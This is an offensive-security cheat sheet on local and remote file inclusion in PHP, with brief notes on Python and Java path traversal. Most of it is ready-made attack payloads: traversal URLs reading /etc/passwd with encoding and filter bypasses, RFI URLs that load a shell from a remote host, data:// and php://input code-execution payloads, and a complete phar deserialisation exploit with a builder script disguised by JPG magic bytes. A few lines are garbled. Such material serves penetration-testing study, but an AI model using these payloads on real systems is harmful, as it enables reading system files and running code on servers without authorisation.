# File inclusion
**Remote File Inclusion (RFI):** The file is loaded from a remote server (Best: You can write the code and the server will execute it). In php this is **disabled** by default (**allow_url_include**).  
**Local File Inclusion (LFI):** The sever loads a local file.

The vulnerability occurs when the user can control in some way the file that is going to be load by the server.

Vulnerable **PHP functions**: require, require_once, include, include_once


# Basic
```
http://domain.com/index.php?page=../../../etc/passwd
```

# URL Encoding
You could use non-standard encodings like double URL encode (and others):
```
http://domain.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://domain.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://domain.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://domain.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

# Filter bypasses

```
http://domain.com/index.php?page=....//....//etc/passwd
http://domain.com/index.php?page=..///////..////..//////etc/passwd
http://domain.com/index.php?page=PhP://filter
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd http://example.com/index.php?page=PhP://filter
```

## Null byte (%00)
Bypass the append more chars at the end of the provided string (bypass of: $_GET['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```  
This is **solved since PHP 5.4**



# Basic RFI and bypasses
```
http://domain.com/index.php?page=http://remote.com/shell.php
http://domain.com/index.php?page=\\remote.com\shell.phpattacker.com\mal.php
```

# PHP Wrappers and Protocls

## php://filter

PHP filters allow one to perform modification on data before it's being read by the server.
Some of the techniques below can be used to bypass restrictions and filters set by the server.
```
# BASE64 encode data
http://domain.com/index.php?page=php://filter/convert.base64-decode/resource=/etc/passwd);
```

## data://

```
http://domain.com/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>

http://domain.com/?page=data://text/plain,<?php phpinfo(); ?>
```

## phar:// and phar deserialisation

A `.phar` file is a PHP archive. One can upload such file and execute code when it is being loaded.
It contains metadata in a serialised format. When parsed on the server said metadata gets deserialised.

Even if the source code on the server is not using the `eval` function, the following other methods will still invoke the vulnerability. `file_get_contents()`,`fopen()`,`file()`,`file_exists()`,`md5_file()`,`filemtime()`,`filesize()`

[Read this for a more in-depth discussion](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization)

### Exploitation
1. Pretend that this is the source code of the server.
```php
# server.php
<?php
class ReadFile{
	public $data = null;
	
	public function __construct($data) {
		$this->data = $data;
	}
	
	function __destruct() {
		system($this->data);
	}
}

file_get_contents("phar://pwned.phar");
?>
```

2. This is the code that will make the `.phar` file.
```php
# make_phar.php
<?php

class ReadFile{

	public $data = null;
	
	public function __construct($data) {
		$this->data = $data;
	}
	
	function __destruct() {
		system($this->data);
	}
}

# Make phar
$phar = new Phar('pwned.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

# Add object of class as metadata
$object = new ReadFile('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();

?>
```

*Magic bytes of JPG* `\xff\xd8\xff` *have been added to the phar file to bypass file upload restrictions*

3. Compile `pwned.phar` with:
```bash
php --define phar.readonly=0 make_phar.php
```

## input://
Specify your payload in the POST parameters:

```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```



# Python Root element
In python in a code like this one:

```python
# file_name is controlled by a user 
os.path.join(os.getcwd(), "public", file_name)
```

If the user passes an **absolute path** to **`file_name`**, the **previous path is just removed**:

```python
os.path.join(os.getcwd(), "public", "/etc/passwd") '/etc/passwd'
```

# Java List Directories
It looks like if you have a Path Traversal in Java and you **ask for a directory** instead of a file, a **listing of the directory is returned**. This won't be happening in other languages.

## Top Parameters
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```


# References
- [https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)
- [https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/phar-deserialization.html](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/phar-deserialization.html)
- [https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)
- [https://www.php.net/manual/en/wrappers.php](https://www.php.net/manual/en/wrappers.php)